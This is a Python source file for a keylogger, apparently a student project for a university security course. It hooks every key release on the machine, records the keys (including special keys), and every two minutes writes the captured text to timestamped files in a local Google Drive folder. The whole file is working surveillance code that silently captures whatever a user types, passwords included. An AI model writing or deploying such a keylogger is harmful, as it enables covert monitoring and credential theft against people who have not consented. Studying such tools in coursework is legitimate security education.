import keyboard

from threading import Timer
from datetime import datetime

REPORT_INTERVAL = 120


class Keylogger:

    def __init__(self, interval):
        self.filename = None
        self.interval = REPORT_INTERVAL
        self.log = ""
        self.startDate = datetime.now()
        self.endDate = datetime.now()

    def keyLog(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def updateFilename(self):
        startDateString = str(self.startDate)[:-7].replace(" ", "-").replace(":", "")
        endDateString = str(self.endDate)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog--{startDateString} to {endDateString}"

    def writeFile(self):
        with open(f"G:\\My Drive\\CMSC 414\\Project\\keylogger reports\\{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved G:\\My Drive\\CMSC 414\\Project\\keylogger reports\\{self.filename}.txt")

    def report(self):
        """Called every interval"""
        if self.log:
            # if there is something in log, report it
            self.endDate = datetime.now()
            # update `self.filename`
            self.updateFilename()
            self.writeFile()

            print(f"[{self.filename}] - {self.log}")
            self.startDate = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        self.startDate = datetime.now()
        keyboard.on_release(callback=self.keyLog)
        self.report()
        keyboard.wait()


if __name__ == "__main__":
    keylogger = Keylogger(interval=REPORT_INTERVAL)
    keylogger.start()
